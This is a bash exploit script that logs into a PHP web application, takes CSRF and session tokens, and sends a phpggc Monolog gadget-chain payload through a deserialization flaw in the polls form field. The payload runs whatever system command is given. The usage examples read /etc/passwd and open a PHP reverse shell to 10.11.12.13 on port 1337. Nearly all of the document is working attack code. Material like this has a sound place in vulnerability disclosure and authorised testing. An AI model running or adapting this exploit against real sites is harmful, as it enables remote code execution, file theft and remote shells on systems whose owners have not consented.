#!/bin/bash

if [ "$#" -ne 4 ]; then
  echo "Usage: $0 url username password command"
  echo
  echo "Examples:"
  echo
  echo "$0 http://rox.ddev.site member-2 password id"
  echo "$0 http://rox.ddev.site member-2 password 'cat /etc/passwd | head -n5'"
  echo "$0 http://rox.ddev.site member-2 password 'php -r '\''\$s=fsockopen(\\\\\"10.11.12.13\\\\\",1337);\$p=proc_open(\\\\\"/bin/bash\\\\\",[\$s,\$s,\$s],\$i);'\'''"
  exit
fi

url="${1%/}"  # 'http://rox.ddev.site' # remove trailing slash
username="$2" # 'member-2'
password="$3" # 'password'
cmd="$4"

# grab a csrf token and initial session cookie
tokens=$(curl -is "$url" | grep '_csrf_token\|PHPSESS')
phpsess=$(echo "$tokens" | grep -o 'PHPSESSID=.*; expires' | sed 's/; expires//g')
csrf=$(echo "$tokens" | grep -o '_csrf_token" value=".*">' | head -n1 | sed 's/_csrf_token" value="//g;s/">//g')

echo "# csrf: $csrf"
echo "# phpsess: $phpsess"

# get authenticated session cookie by logging in with valid creds
auth_cookie=$(curl -is "$url/login_check" -d "_username=$username&_password=$password&_csrf_token=$csrf" -b "$phpsess" | grep -o 'PHPSESSID=.*; expires' | sed 's/; expires//g')

echo "# auth_cookie: $auth_cookie"

count_chars="${#cmd}"
# try to account for slashes that will be removed before unserialize()
slashes="${cmd//[^\\]}"
num_slashes="${#slashes}"
let count_chars=$count_chars-$num_slashes

# e.g. s:8:\"uname -a\";
element="s:${count_chars}:\"$cmd\""

# phpggc -w addslashes.php --public-properties -f Monolog/RCE1 system 'command'
payload='a:2:{i:7;O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\0*\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\0*\0handler\";r:3;s:13:\"\0*\0bufferSize\";i:-1;s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{i:0;~PLACEHOLDER~;s:5:\"level\";N;}}s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}i:7;i:7;}'

# This will only work if there are no ^ chars in the cmd
payload=$(echo $payload | sed "s^~PLACEHOLDER~^$element^")

echo "# element: $element"
echo "# payload: $payload"
echo

# send exploit
curl "$url/polls" -b "$auth_cookie" -d "formkit_memory_recovery=$payload"